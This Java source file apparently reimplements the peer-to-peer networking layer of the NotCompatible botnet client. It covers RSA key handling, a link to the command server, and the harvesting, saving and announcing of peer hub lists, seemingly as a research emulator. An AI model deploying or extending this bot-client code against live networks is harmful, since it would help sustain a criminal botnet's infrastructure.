package diff.notcompatible.c.bot.net;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.util.logging.Logger;

import diff.notcompatible.c.bot.crypto.RSA;
import diff.notcompatible.c.bot.net.tcp.Link;
import diff.notcompatible.c.bot.net.tcp.Link.LinkStatus;
import diff.notcompatible.c.bot.net.tcp.P2PLink;
import diff.notcompatible.c.bot.net.tcp.P2PListen;
import diff.notcompatible.c.bot.net.tcp.objects.P2PConnectionList;
import diff.notcompatible.c.bot.net.udp.UDPMixer;
import diff.notcompatible.c.bot.net.udp.UDPPoint;
import diff.notcompatible.c.bot.objects.Config;
import diff.notcompatible.c.bot.objects.HubList;
import diff.notcompatible.c.bot.objects.HubListItem;
import diff.notcompatible.c.bot.objects.Packet;

public class ThreadServer implements Runnable {

    private final static Logger LOGGER = Logger.getLogger("session");

    public NIOServer nio;
    public int connectionType;
    public boolean isOpenPort;
    public int isOpenPortTested;
    public boolean isIPDetected;
    public String ip;
    public int port;

    // Context
    public Object owner;
    public Link socks;
    public P2PConnectionList p2plist;
    public RSA RSAGlobal;
    public RSA RSALocal;
    public Config config;

    public HubList hubList;
    public HubList udpList;

    public ConnectionManager connectionManager;

    public UDPMixer udpMixer;

    protected long lastCheckHub;
    protected long lastCheckP2P;
    protected long lastCheckUDP;

    public File sessionDirectory;

    public void init(File currentSessionDirectory, File serverPublicKey, File clientPublicKey, File clientPrivateKey) {

        sessionDirectory = currentSessionDirectory;

        if ((serverPublicKey == null) || !serverPublicKey.exists()) {
            serverPublicKey = new File("resources/default.pub");
        }
        // Public key for bot to respect
        RSAGlobal = new RSA();
        RSAGlobal.loadKey(serverPublicKey);

        RSALocal = new RSA();
        // Generate own (public/private) key for communication if nothing was passed in
        if ((clientPrivateKey == null) || (clientPublicKey == null)) {
            RSALocal.genKey();
            RSALocal.saveClientPublic(currentSessionDirectory);
            RSALocal.saveClientPrivate(currentSessionDirectory);
        } else {
            RSALocal.loadClientPublic(clientPublicKey);
            RSALocal.loadClientPrivate(clientPrivateKey);
        }

        // Load bot configuration - or initialize from const data if available
        config = new Config(sessionDirectory);
        config.load();

        // Load hub list if one exists
        hubList = new HubList();
        hubList.tag = "HUBLIST";
        loadHubList();

        // Load udp hub list if one exists
        udpList = new HubList();
        udpList.tag = "UDPHUBLIST";
        loadUDPHubList();

        // Load data out of configuration
        connectionManager = new ConnectionManager(config);
        connectionManager.load();

        port = config.packet.getByName("PORT").asWord();

        // XXX: Hack for running not as sudo right now...
        if (port < 1024) {
            port += 1024;
        }

        // Extracted out so I can selectively override them
        createP2PListen();
        createUDPMixer();
    }

    public void createP2PListen() {
        try {
            new P2PListen(this).listen(port);
            LOGGER.info(" [*] P2P Listening on port [ " + port + " ]");
        } catch (IOException exception) {
            LOGGER.throwing(exception.getClass().getName(), "createP2PListen()", exception);
            exception.printStackTrace();
        }
    }

    public void createUDPMixer() {
        udpMixer = new UDPMixer(this);
        try {
            udpMixer.bind(port);
            LOGGER.info(" [*] UDP Listening on port [ " + port + " ]");
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "createUDPMixer()", exception);
            exception.printStackTrace();
        }
    }

    public ThreadServer(Object ownerObject) {
        nio = null;
        connectionType = 0;
        lastCheckHub = 0;
        lastCheckP2P = 0;
        lastCheckUDP = 0;
        isOpenPort = false;
        isOpenPortTested = 0;
        isIPDetected = false; // Misspelled to isIPDetedted
        ip = "";
        port = 0;
        owner = ownerObject;

        try {
            nio = new NIOServer();
            socks = new Link(this);
            p2plist = new P2PConnectionList();
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "ThreadServer()", exception);
            exception.printStackTrace();
        }
    }

    @Override
    public void run() {
        while (true) {
            try {
                if (hasInternet()) {
                    nio.DispQuery();
                    if ((socks != null) && ((socks.lastConnect + 10000L) < System.currentTimeMillis())
                                    && (socks.status == LinkStatus.OFFLINE)) {
                        socks.init();
                        socks.connect(connectionManager.getServer());
                    }
                    checkHub();
                    checkP2PConnection();
                    checkUDP();
                } else {
                    // bot "lost connection" so sleep and reset values so we can re-initiate when back online
                    isIPDetected = false;
                    isOpenPort = false;
                    isOpenPortTested = 0;
                    Thread.sleep(1000);
                }
            } catch (InterruptedException exception) {
                LOGGER.throwing(exception.getClass().getName(), "run()", exception);
                exception.printStackTrace();
            } catch (Exception exception) {
                LOGGER.throwing(exception.getClass().getName(), "run()", exception);
                exception.printStackTrace();
            }
        }
    }

    /**
     * Clear expired hubs in the lists and attempt to harvest more
     */
    public void checkHub() {
        if ((lastCheckHub + 20000L) < System.currentTimeMillis()) {
            lastCheckHub = System.currentTimeMillis();
            hubList.clearExpired();
            udpList.clearExpired();
            saveHubList();
            saveUDPHubList();
            P2PLink p2pLink;
            if ((hubList.getCandidateCount() < 5) || (udpList.getCandidateCount() < 5)) {
                if ((socks != null) && socks.isConnected()) {
                    socks.sendGetHubList();
                }

                if ((hubList.count() < 100) || (hubList.getCandidateCount() < 100) || (udpList.count() < 100)
                                || (udpList.getCandidateCount() < 5)) {
                    for (int i = 0; i < p2plist.getCount(); i++) {
                        p2pLink = p2plist.getByIndex(i);
                        if (p2pLink.isConnected()) {
                            p2pLink.sendGetHubList();
                        }
                    }
                }
            }
        }
    }

    public void checkP2PConnection() {
        if ((lastCheckP2P + 10000L) < System.currentTimeMillis()) {
            lastCheckP2P = System.currentTimeMillis();

            for (int i = 0; i < p2plist.getCount(); i++) {
                if (p2plist.getByIndex(i).isConnected()) {
                    if ((p2plist.getByIndex(i).lastConnect + 15000L) > lastCheckP2P) {
                        p2plist.getByIndex(i).close();
                    }
                }
            }

            if ((hubList.getCandidateCount() > 0) && (p2plist.getConnections() < 4) && (p2plist.getCandidates() < 5)) {
                HubListItem item = hubList.getNextToConnect();
                if (item.ip.equals(ip) && (item.port == port)) {
                    item.used = true;
                } else {
                    if (!p2plist.checkSubnet(item.ip)) {
                        item.used = true;
                        item.lastTested = lastCheckP2P;
                        item.lastConnect = lastCheckP2P;
                        item.connectCount++;

                        P2PLink p2pLink = new P2PLink(this);
                        p2pLink.hr = item;
                        p2pLink.connect(new InetSocketAddress(item.ip, (int) item.port));

                        p2plist.add(p2pLink);
                    } else {
                        item.used = false;
                        item.status = -1;
                        item.lastTested = lastCheckP2P;
                    }
                }
            }

            if ((udpList.getCandidateCount() > 0) && (udpMixer.getConnections() < 2) && (udpMixer.getCandidates() < 15)) {
                HubListItem item = udpList.getNextToConnect();
                UDPPoint udpPoint = udpMixer.createLink(item.ip, (int) item.port);

                if (udpPoint == null) {
                    item.used = true;
                } else {
                    item.used = true;
                    item.lastTested = lastCheckP2P;
                    item.connectCount++;
                    udpPoint.hr = item;
                    udpPoint.sendPublic();
                }
            }

            if ((udpMixer != null) && (udpMixer.getConnections() > 0) && (udpMixer.getConnections() < 0x32)) {
                udpMixer.createU2ULink();
            }
        }
    }

    public void checkUDP() {
        long fp = System.currentTimeMillis();
        if ((lastCheckUDP + 1000) < fp) {
            lastCheckUDP = fp;
            udpMixer.check();
        }
    }

    // originally getInnet()
    private boolean hasInternet() {
        return true;
    }

    // Gets local "hl.bin"
    private void loadHubList() {
        try {
            File hubListFile = new File(sessionDirectory.getPath() + "/hl.bin");
            if (hubListFile.exists()) {
                InputStream fi = new FileInputStream(hubListFile);
                byte[] buffer = new byte[fi.available()];
                DataInputStream file = new DataInputStream(fi);

                file.read(buffer);
                hubList.loadFromRaw(buffer);
                LOGGER.info(" [*] Loaded [ " + hubList.count() + " ] hubs");

                file.close();
                fi.close();
            } else {
                LOGGER.warning(" [!] No Hub list found - likely never created!");
            }
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "loadHubList()", exception);
            exception.printStackTrace();
        }
    }

    // Gets local "uhl.bin"
    private void loadUDPHubList() {
        try {
            File udpHubListFile = new File(sessionDirectory.getPath() + "/uhl.bin");
            if (udpHubListFile.exists()) {
                InputStream fi = new FileInputStream(udpHubListFile);
                byte[] buffer = new byte[fi.available()];
                DataInputStream file = new DataInputStream(fi);

                file.read(buffer);
                udpList.loadFromRaw(buffer);
                LOGGER.info(" [*] Loaded [ " + udpList.count() + " ] hubs");

                file.close();
                fi.close();
            } else {
                LOGGER.warning(" [!] No UDP Hub list found - likely never created!");
            }
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "loadUDPHubList()", exception);
            exception.printStackTrace();
        }
    }

    // Might be better named "openPort" but this is what the malware calls it
    public void portOpen() {
        isOpenPort = true;
        // Ping the boss man with an open port packet
        if ((socks != null) && socks.isConnected()) {
            socks.sendOP();
        }

        Packet hubListPacket = new Packet();
        hubListPacket.tag = "HUBLIST";

        Packet itemPacket = hubListPacket.add();
        itemPacket.tag = "Item";

        Packet ipPacket = itemPacket.add();
        ipPacket.tag = "IP";

        // This sometimes can happen, just fake it I guess
        if (ip.isEmpty()) {
            ip = "127.0.0.1";
        }

        ipPacket.buffer.putIP(ip);
        ipPacket = itemPacket.add();
        ipPacket.tag = "Port";
        ipPacket.buffer.putPort(port);

        // Tell the p2p list what the ip and port that are newly opened is
        for (int i = 0; i < p2plist.getCount(); i++) {
            if ((p2plist.getByIndex(i) != null) && p2plist.getByIndex(i).isConnected()) {
                p2plist.getByIndex(i).sendEncrypt(hubListPacket.pack());
            }
        }
    }

    public void saveUDPHubList() {
        try {
            DataOutputStream file = new DataOutputStream(new FileOutputStream(sessionDirectory.getPath() + "/uhl.bin"));
            file.write(udpList.asRaw());
            file.flush();
            file.close();
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "saveUDPHubList()", exception);
            exception.printStackTrace();
        }
    }

    public void saveHubList() {
        try {
            DataOutputStream file = new DataOutputStream(new FileOutputStream(sessionDirectory.getPath() + "/hl.bin"));
            file.write(hubList.asRaw());
            file.flush();
            file.close();
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "saveHubList()", exception);
            exception.printStackTrace();
        }
    }

    // Send LID to P2P and UDP lists
    public void sendSET() {
        for (int i = 0; i < p2plist.getCount(); i++) {
            P2PLink p2pLink = p2plist.getByIndex(i);
            if ((p2pLink != null) && p2pLink.isConnected()) {
                p2pLink.sendLID();
            }
        }

        for (int i = 0; i < udpMixer.count(); i++) {
            UDPPoint udpPoint = udpMixer.list.getByIndex(i);
            if ((udpPoint != null) && udpPoint.isEncrypt) {
                udpPoint.sendLID();
            }
        }
    }

    public void IPDetected(String detectedIp) {
        isIPDetected = true;
        ip = detectedIp;
    }
}
